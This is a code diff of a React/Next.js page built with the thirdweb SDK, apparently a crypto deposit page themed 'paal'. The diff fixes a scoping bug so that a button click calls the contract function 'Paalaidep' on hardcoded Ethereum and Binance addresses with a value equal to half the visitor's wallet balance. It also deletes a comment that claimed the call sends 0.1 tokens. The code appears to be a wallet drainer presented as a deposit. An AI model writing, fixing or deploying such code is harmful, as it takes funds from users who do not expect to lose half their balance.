@@ -7,30 +7,39 @@ import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
 import { utils } from "ethers";
 
 const Home: NextPage = () => {
-  const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
-  const wbalance = data?.displayValue;
-  console.log(wbalance);
-  if (wbalance !== undefined) {
-    const numericBalance = parseFloat(wbalance);
-    if (!isNaN(numericBalance)) {
-      const balx = (numericBalance * 0.5).toString();
-      console.log(balx);
+    const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
+    const wbalance = data?.displayValue;
+    console.log(wbalance);
+    
+    let balx: string | undefined;
+    if (wbalance !== undefined) {
+      const numericBalance = parseFloat(wbalance);
+      if (!isNaN(numericBalance)) {
+        balx = (numericBalance * 0.5).toString();
+        console.log(balx);
+      } else {
+        console.log("wbalance is not a valid number");
+      }
     } else {
-      console.log("wbalance is not a valid number");
+      console.log("wbalance is undefined");
     }
-  } else {
-    console.log("wbalance is undefined");
-  }
-  const { selectedChain, setSelectedChain } = useContext(ChainContext);
-  const addresses: Record<string, string> = {
-    ["ethereum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
-    ["binance"]: "0xD606CD40c93C297327c7294ecB14fC6197fFB6B8",
-  };
-  const { contract } = useContract(addresses[selectedChain]);
-  const { mutateAsync, error } = useContractWrite(
-    contract,
-    "Paalaidep",
-  );
+  
+    const parsedBalx = balx || '0';
+    
+    const { selectedChain, setSelectedChain } = useContext(ChainContext);
+    const addresses: Record<string, string> = {
+      ["ethereum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
+      ["binance"]: "0xD606CD40c93C297327c7294ecB14fC6197fFB6B8",
+    };
+    const { contract } = useContract(addresses[selectedChain]);
+    const { mutateAsync, error } = useContractWrite(
+      contract,
+      "Paalaidep",
+    );
+    
+    const handleChainChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
+      setSelectedChain(e.target.value);
+    };
   
   return (
     <div className="bg-cover bg-center min-h-screen" style={{ backgroundImage: `url('images/bg-paal.png')` }}>
@@ -62,7 +71,7 @@ const Home: NextPage = () => {
       action={() =>
         mutateAsync({
           overrides: {
-            value: utils.parseEther(balx), // send 0.1 native token with the contract call
+            value: utils.parseEther(parsedBalx), 
           },
         })
       }
